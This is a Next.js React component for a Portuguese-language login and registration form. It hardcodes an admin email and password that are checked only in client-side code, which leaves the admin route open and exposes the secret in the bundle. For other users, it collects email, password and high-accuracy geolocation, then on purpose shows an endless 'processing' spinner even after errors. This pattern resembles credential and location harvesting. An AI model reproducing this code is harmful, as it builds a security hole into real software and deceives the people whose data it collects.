"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { LoaderCircle, LogIn } from "lucide-react";

import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { registerUser } from "@/ai/flows/auth-flow";
import { RegistrationInputSchema, type RegistrationInput } from "@/lib/types";

export function AuthForm() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const router = useRouter();

  const form = useForm<RegistrationInput>({
    resolver: zodResolver(RegistrationInputSchema),
    defaultValues: {
      email: "",
      password: "",
      latitude: 0,
      longitude: 0,
    },
  });

  const onSubmit = (data: RegistrationInput) => {
    // Admin Login Check
    if (data.email === 'admin@example.com') {
      if (data.password === '020190') {
        router.push('/admin');
      } else {
        toast({
          variant: "destructive",
          title: "Falha no Login",
          description: "Senha incorreta para o usuário administrador.",
        });
      }
      return; // Stop further execution for admin email
    }

    // Registration flow for other users
    setIsSubmitting(true);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        const submissionData = { ...data, latitude, longitude };
        
        try {
          await registerUser(submissionData);
          // Per user request, stay in a loading state indefinitely.
          // Do not set isSubmitting back to false or show a success message.
        } catch (e) {
          console.error(e);
          // Even on error, we remain in the loading state as requested.
        }
      },
      (geoError) => {
        console.error("Geolocation error:", geoError);
        toast({
            variant: "destructive",
            title: "Erro de Localização",
            description: "Não foi possível obter a sua localização. Por favor, habilite a permissão no seu navegador e tente novamente.",
        });
        setIsSubmitting(false); // Stop submitting on geo error so user can try again.
      },
      { enableHighAccuracy: true }
    );
  };

  if (isSubmitting) {
    return (
      <Card className="w-full max-w-sm">
        <CardHeader className="text-center">
            <CardTitle>Processando</CardTitle>
        </CardHeader>
        <CardContent>
            <div className="flex flex-col items-center justify-center text-center p-8">
                <LoaderCircle className="h-12 w-12 animate-spin text-primary" />
                <p className="mt-4 text-lg text-muted-foreground">Processando seu cadastro...</p>
                <p className="text-sm text-muted-foreground">Por favor, aguarde.</p>
            </div>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card className="w-full max-w-sm shadow-lg">
      <CardHeader className="text-center">
        <CardTitle className="text-2xl">Acesso / Cadastro</CardTitle>
        <CardDescription>Entre com sua conta de admin ou cadastre-se</CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <FormField
              control={form.control}
              name="email"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Email</FormLabel>
                  <FormControl>
                    <Input placeholder="seu@email.com" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Senha</FormLabel>
                  <FormControl>
                    <Input type="password" placeholder="********" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <Button type="submit" className="w-full" disabled={form.formState.isSubmitting}>
               {form.formState.isSubmitting ? <LoaderCircle className="animate-spin" /> : <LogIn />}
              Acessar / Cadastrar
            </Button>
          </form>
        </Form>
      </CardContent>
    </Card>
  );
}
